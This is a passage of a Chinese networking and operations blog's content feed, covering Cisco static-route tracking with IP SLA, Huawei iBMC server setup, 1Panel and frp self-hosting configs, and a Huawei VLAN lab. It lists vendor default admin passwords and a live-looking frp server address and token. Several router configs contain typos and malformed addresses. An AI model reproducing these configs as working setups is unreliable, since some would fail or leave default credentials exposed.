10px;"></span></div></pre></details><details open=""><summary>R2</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R2<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/0ip address 12.1.1.2 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/1ip address 23.1.1.2 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface loopback 0ip address 2.2.2.2 255.255.255.255<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 13.1.1.0 255.255.255.0 ethernet 0/0 12.1.1.1ip route 3.3.3.0 255.255.255.0 etheret 0/1 23.1.1.3 permanent<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip sla 23icmp-echo 13.1.1.3 <span class="hljs-built_in" style="color: rgb(230, 192, 123);">source</span> 12.1.1.2frequency 5threshold 1000timeout 2000<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip sla schedule 23 start-time now life forevertrack 23 ip sla 23 reachability<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 3.3.3.3 255.255.255.255 ethernet 0/0 12.1.1.1 track 23</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R3</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R3<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/0ip address 13.1.1.3 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/1ip address 23.1.1.3 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface loopback 0ip address 3.3.3.3 255.255.255.255<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 12.1.1.2 255.255.255.255 ethernet 0/0 13.1.1.1ip route 2.2..2.0 255.255.255.0 ethernet 0/1 23.1.1.2 permanent<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip sla 23icmp-echo 12.1.1.2 <span class="hljs-built_in" style="color: rgb(230, 192, 123);">source</span>-ip 13.1.1.3frequency 5threshold 1000timeout 2000<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip sla schedule 23 start-time now life forevertrack 23 ip sla 23 reachability<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 2.2.2.2 255.255.255.255 ethernet 0/0 13.1.1.1 track 23</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>测试验证</summary><pre style="position: relative;"><code class="language-shell hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;"><span class="hljs-meta" style="color: rgb(97, 174, 238);">#</span><span class="bash"> tarcert</span>traceroute 3.3.3.3 source 2.2.2.2 numeric<span class="hljs-meta" style="color: rgb(97, 174, 238);">#</span><span class="bash"> ping</span>ping 3.3.3.3 source 2.2.2.2 repeat 10000<span class="hljs-meta" style="color: rgb(97, 174, 238);">#</span><span class="bash"> show</span>show ip sla statisticsshow run | section track</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-shell</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><hr><h2 id="SLA-和路由递归查询"><a href="#SLA-和路由递归查询" class="headerlink" title="SLA 和路由递归查询"></a>SLA 和路由递归查询</h2><p>路由递归查询的场景；静态路由联动 SLA 检测工具实现自动化切换；路由非直连下一跳与递归的应用。<br>若 R2 去往 R3 背后的 100 个网络，有 R1(主)和 R4(备)的 2 条路径，可使用递归查询的方式，只需要在 R2 上面写 100 条路由下一跳为 R3 e0&#x2F;1 的递归路由和 2 条主备路由即可，</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202306112037348.png" alt="实验拓扑"></p><p>实验拓扑</p><details open=""><summary>配置概述</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">1. 配置接口IP和环回地址2. 配置去往R3背后网络的静态路由(不可以配置出接口)3. 配置备份路径的静态路由，修改管理距离为104. 配置SLA,SLA的检查路径1= R2 0/0 到 R1 e0/1, 路径2= R3 0/1 到 R1 e0/05. 配置track 23 ip sla 236. 配置主路径的静态路由 track<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;"># 配置非直连下一跳的静态路由的时候不要携带出接口信息</span></code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R1</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R1<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/0ip address 124.1.1.1 255.255.255.0no shutdown<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/1ip address 134.1.1.1 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 2.2.2.2 255.255.255.255 ethernet 0/0 124.1.1.2ip route 3.3.3.3 255.255.255.255 ethernet 0/1 134.1.1.3<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span></code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R2</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R2<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/0ip address 124.1.1.2 255.255.255.0no shutdown<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface loopback 0ip address 2.2.2.2 255.255.255.255<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 3.3.3.3 255.255.255.255 134.1.1.3ip route 134.1.1.0 255.255.255.0 ethernet 0/0 124.1.1.4<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip sla 2011icmp-echo 134.1.1.1 <span class="hljs-built_in" style="color: rgb(230, 192, 123);">source</span>-ip 124.1.1.2frequency 5threshold 1000timeout 2000<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span>ip sla schedule 2011 start-time now life forevertrack 21 ip sla 2011 reachability<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span>ip route 134.1.1.3 255.255.255.255 ethernet 0/0 124.1.1.1 track 21<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span></code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R3</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R3<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/0ip address 124.1.1.4 255.255.255.0no shutdown<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ehternet 0/1ip address 134.1.1.4 255.255.255.0no shutdown<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 2.2.2.2 255.255.255.255 ethernet 0/0 124.1.1.2ip route 3.3.3.3 255.255.255.255 ethernet 0/1 134.1.1.3<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip sla 3010icmp-echo 124.1.1.1 <span class="hljs-built_in" style="color: rgb(230, 192, 123);">source</span>-ip 134.1.1.3frequency 5threshold 1000timeout 2000<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span>ip sla schedule 3010 start-time now life forevertrack 31 ip sla 3010 reachability<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span>ip route 124.1.1.2 255.255.255.255 ethernet 0/0 134.1.1.1 track 31</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R4</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R4<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/0ip address 134.1.1.3 255.255.255.255no shutdown<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface loopback 0ip address 3.3.3.3.3 255.255.255.255<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 2.2.2.2 255.255.255.255 124.1.1.2ip route 124.1.1.0 255.255.255.0 ethernet 0/0 134.1.1.4<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span></code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>测试验证</summary><pre style="position: relative;"><code class="language-shell hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">show ip sla stashow ip sla sum</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-shell</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><hr><h2 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h2><p>实验概述。</p><p><img src="https://hjxstart.github.io/" alt="实验拓扑"></p><p>实验拓扑</p><details open=""><summary>配置概述</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">1.</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre><p style="line-height: inherit; margin-top: 22px; margin-bottom: 22px;">xxxxxxxxxx&nbsp;bash</p><details open=""><summary>R1</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;"><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span><span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span>configure terminalhostname R1</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>测试验证</summary></details><hr><h2 id="实验模板" style="color: rgb(51, 51, 51); line-height: 1.5; margin-top: 35px; margin-bottom: 10px; padding-bottom: 12px; font-size: 24px; border-bottom: 1px solid rgb(236, 236, 236);"><a href="https://hjxstart.github.io/2023/06/01/CCNP%20Lab/#%E5%AE%9E%E9%AA%8C%E6%A8%A1%E6%9D%BF" class="headerlink" title="实验模板" style="color: rgb(2, 105, 200); text-decoration: none; cursor: pointer; transition: color 0.35s; word-break: break-all; border-bottom: 1px solid rgb(209, 233, 255);"></a>实验模板</h2><p style="line-height: inherit; margin-top: 22px; margin-bottom: 22px;">实验概述。</p><p style="line-height: inherit; margin-top: 22px; margin-bottom: 22px;"></p><div class="div_img" style="margin: 0px; padding: 10px 0px; text-align: center;"><img src="https://hjxstart.github.io/" alt="实验拓扑" style="max-width: 95%; display: inline-block; margin: auto; cursor: zoom-in; padding: 1px;"><div class="img_alt" style="text-align: center;"><span style="border-bottom: 1px solid rgb(217, 217, 217); padding: 10px 30px; color: rgb(150, 150, 150); font-family: &quot;Open Sans&quot;, &quot;Hiragino Sans GB&quot;, sans-serif; display: inline-block;">实验拓扑</span></div></div><p></p><details open=""><summary>配置概述</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">1.</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R1</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;"><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span><span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span>configure terminalhostname R1</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>测试验证</summary></details><hr><span style="font-style: italic; color: gray;">转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 hjxstart@126.com</span></details>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IBMC</title>
      <link href="/2023/05/13/IBMC/"/>
      <url>/2023/05/13/IBMC/</url>
      
        <content type="html"><![CDATA[<h2 id="登录IBMC"><a href="#登录IBMC" class="headerlink" title="登录IBMC"></a>登录IBMC</h2><h3 id="配置本机IP地址"><a href="#配置本机IP地址" class="headerlink" title="配置本机IP地址"></a>配置本机IP地址</h3><pre><code class="hljs bash"><span class="hljs-comment"># 右键网络图标，点击网络和Internet设置，在属性找到本地网络，配置IP地址,</span><span class="hljs-comment">#一般配置为192.168.2.101等，因为华为之类的默认的IBMC网络地址是192.168.2.100</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912121526086.png" alt="img"></p><h3 id="笔电连接到服务器Mgnt口"><a href="#笔电连接到服务器Mgnt口" class="headerlink" title="笔电连接到服务器Mgnt口"></a>笔电连接到服务器Mgnt口</h3><p><img src="file:///C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20250912121317326.png" alt="image-20250912121317326"></p><p>image-20250912121317326</p><h3 id="登录WEB界面"><a href="#登录WEB界面" class="headerlink" title="登录WEB界面"></a>登录WEB界面</h3><pre><code class="hljs bash"><span class="hljs-comment"># 华为</span>浏览器打开192.168.2.100默认账号密码都在服务器上写着，注意大小写敏感AdministratorAdmin@9000<span class="hljs-comment"># 天宫</span>Tech.ONTianGong8000@</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912121806825.png" alt="img"></p><h3 id="配置RAID"><a href="#配置RAID" class="headerlink" title="配置RAID"></a>配置RAID</h3><pre><code class="hljs bash"><span class="hljs-comment"># 点击系统管理下存储管理，配置磁盘raid，一般系统盘（2块一样大小固态盘，配置Raid1），数据盘（3块一样大小配置Raid5）</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912121944510.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122107392.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122127683.png" alt="img"></p><h3 id="打开HTML共享控制台"><a href="#打开HTML共享控制台" class="headerlink" title="打开HTML共享控制台"></a>打开HTML共享控制台</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122259803.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122334760.png" alt="挂载镜像"></p><p>挂载镜像</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122427111.png" alt="设置启动顺序"></p><p>设置启动顺序</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250912122455233.png" alt="重启机器"></p><p>重启机器</p><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1Panel</title>
      <link href="/2023/04/26/1Panel/"/>
      <url>/2023/04/26/1Panel/</url>
      
        <content type="html"><![CDATA[<h1 id="1Panel"><a href="#1Panel" class="headerlink" title="1Panel"></a>1Panel</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><pre><code class="hljs bash"></code></pre><hr><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><h3 id="Frpc"><a href="#Frpc" class="headerlink" title="Frpc"></a>Frpc</h3><pre><code class="hljs bash"><span class="hljs-comment"># proxies</span>serverAddr = <span class="hljs-string">&quot;154.222.24.28&quot;</span>serverPort = 7000auth.method = <span class="hljs-string">&quot;token&quot;</span>auth.token = <span class="hljs-string">&quot;FRPS&quot;</span>[[proxies]]name = <span class="hljs-string">&quot;7735h-rdp&quot;</span><span class="hljs-built_in">type</span> = <span class="hljs-string">&quot;xtcp&quot;</span>secretKey = <span class="hljs-string">&quot;&quot;</span>localIP = <span class="hljs-string">&quot;127.0.0.1&quot;</span>localPort = 3389<span class="hljs-comment"># visitors</span>serverAddr = <span class="hljs-string">&quot;154.222.24.28&quot;</span>serverPort = 7000auth.method = <span class="hljs-string">&quot;token&quot;</span>auth.token = <span class="hljs-string">&quot;FRPS&quot;</span>[[visitors]]name = <span class="hljs-string">&quot;zdy_&quot;</span><span class="hljs-built_in">type</span> = <span class="hljs-string">&quot;xtcp&quot;</span>serverName = <span class="hljs-string">&quot;7735h-rdp&quot;</span>secretKey = <span class="hljs-string">&quot;&quot;</span>bindAddr = <span class="hljs-string">&quot;0.0.0.0&quot;</span>bindPort = 6000keepTunnelOpen = <span class="hljs-literal">true</span></code></pre><hr><h2 id="Cloudreve"><a href="#Cloudreve" class="headerlink" title="Cloudreve"></a>Cloudreve</h2><pre><code class="hljs bash"><span class="hljs-comment"># 七牛存储策略</span></code></pre><hr><h2 id="maxkb"><a href="#maxkb" class="headerlink" title="maxkb"></a>maxkb</h2><pre><code class="hljs bash"></code></pre><hr><h2 id="jumpserver"><a href="#jumpserver" class="headerlink" title="jumpserver"></a>jumpserver</h2><pre><code class="hljs bash"></code></pre><hr><h2 id="zyplayer-doc"><a href="#zyplayer-doc" class="headerlink" title="zyplayer-doc"></a>zyplayer-doc</h2><pre><code class="hljs bash"><span class="hljs-comment"># 配置系统功能配置时，onlyoffice和drawio需要配置https域名</span></code></pre><blockquote><p>docker-compose.yml</p></blockquote><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-attr">services:</span>  <span class="hljs-attr">zyplayer:</span>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">zyplayer-doc</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-beijing.aliyuncs.com/zyplayer/zyplayer-doc:latest</span>    <span class="hljs-attr">ports:</span>      <span class="hljs-bullet">-</span> <span class="hljs-number">8083</span><span class="hljs-string">:8083</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DATASOURCE_HOST_PORT=10.0.142.2:3306</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DATASOURCE_DATABASE=zyplayer_doc</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DATASOURCE_USER=zyplayer</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DATASOURCE_PASSWORD=</span>    <span class="hljs-comment"># 指定数据库密码</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./files:/zyplayer/files</span>    <span class="hljs-attr">healthcheck:</span>      <span class="hljs-attr">test:</span> [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&quot;http://localhost:8083&quot;</span>]      <span class="hljs-attr">interval:</span> <span class="hljs-string">5s</span>      <span class="hljs-attr">timeout:</span> <span class="hljs-string">5s</span>      <span class="hljs-attr">retries:</span> <span class="hljs-number">10</span>      <span class="hljs-attr">start_period:</span> <span class="hljs-string">10s</span><span class="hljs-string">language-yml复制代码</span></code></pre><hr><h2 id="surveyking"><a href="#surveyking" class="headerlink" title="surveyking"></a>surveyking</h2><pre><code class="hljs yml"><span class="hljs-attr">services:</span>    <span class="hljs-attr">surveyking:</span>        <span class="hljs-attr">image:</span> <span class="hljs-string">surveyking/surveyking:latest</span>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">surveyking</span>        <span class="hljs-attr">volumes:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">./files:/app/files</span>  <span class="hljs-comment"># 文件目录，存储上传的文件，冒号左侧改成自己的，下同</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/app/logs</span>    <span class="hljs-comment"># 运行日志</span>        <span class="hljs-attr">ports:</span>            <span class="hljs-bullet">-</span> <span class="hljs-number">41991</span><span class="hljs-string">:1991</span> <span class="hljs-comment"># 冒号左侧可改</span>        <span class="hljs-attr">environment:</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">PROFILE=mysql</span>                       <span class="hljs-comment"># 使用外部 MySQL 数据库</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_USER=surveyking</span>               <span class="hljs-comment"># 数据库用户名</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_PASS=</span>               <span class="hljs-comment"># 数据库密码</span>            <span class="hljs-bullet">-</span> <span class="hljs-string">DB_URL=jdbc:mysql://10.0.142.2:3306/surveyking?rewriteBatchedStatements=true&amp;useUnicode=true&amp;characterEncoding=UTF-8</span>        <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><span class="hljs-string">language-yml复制代码</span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HCNA Lab</title>
      <link href="/2023/04/08/HCNA-Lab/"/>
      <url>/2023/04/08/HCNA-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简单的VLAN实验"><a href="#一、简单的VLAN实验" class="headerlink" title="一、简单的VLAN实验"></a>一、简单的VLAN实验</h2><p>设PC1和PC3都是VLAN13，PC2和PC4属于VLAN24，实现同一个VLAN的设备可以互通。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202304081908634.png" alt="网络拓扑"></p><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1. 交换机：在SW1~3都创建2个vlan；2. 交换机-交换机：在交换机之间的连接接口配置中继，并且放行相应的VLAN；3. 交换机-PC：在交换机与PC连接的接口配置Access接口，并且方通相应的VLAN；4. PC：配置对于VLAN的IP。</code></pre></details><details>  <summary>SW1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname SW1vlan batch 13 24display vlan<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1port link-type trunkport trunk allow-pass vlan 13 24quitinterface GigabitEthernet 0/0/2port link-type trunkport trunk allow-pass vlan 13 24<span class="hljs-comment"># </span>display port vlan<span class="hljs-comment"># </span></code></pre></details><details>  <summary>SW2</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname SW2vlan batch 13 24display vlan<span class="hljs-comment"># </span>interface Ethernet 0/0/1port link-type trunkport trunk allow-pass vlan 13 24quitdisplay port vlan<span class="hljs-comment"># </span>interface Ethernet 0/0/2port link-type accessport default vlan 13stp edged-port <span class="hljs-built_in">enable</span>interface Ethernet 0/0/3port link-type accessport default vlan 24stp edged-port <span class="hljs-built_in">enable</span>quitdisplay port vlan</code></pre></details><details>  <summary>SW3</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname SW3 vlan batch 13 24 display vlan<span class="hljs-comment"># </span>interface Ethernet 0/0/1port link-type trunkport trunk allow-pass vlan 13 24quit display port vlan<span class="hljs-comment"># </span>interface Ethernet 0/0/2port link-type accessport default vlan 13stp edged-port <span class="hljs-built_in">enable</span>interface Ethernet 0/0/3port link-type accessport default vlan 24stp edged-port <span class="hljs-built_in">enable</span>quitdisplay port vlan</code></pre></details><details>  <summary>实验验证</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># PC1 ping PC3</span>ping 13.1.1.3<span class="hljs-comment"># PC2 ping PC4</span>ping 24.1.1.4</code></pre></details><hr><h2 id="二、简单的静态路由实验"><a href="#二、简单的静态路由实验" class="headerlink" 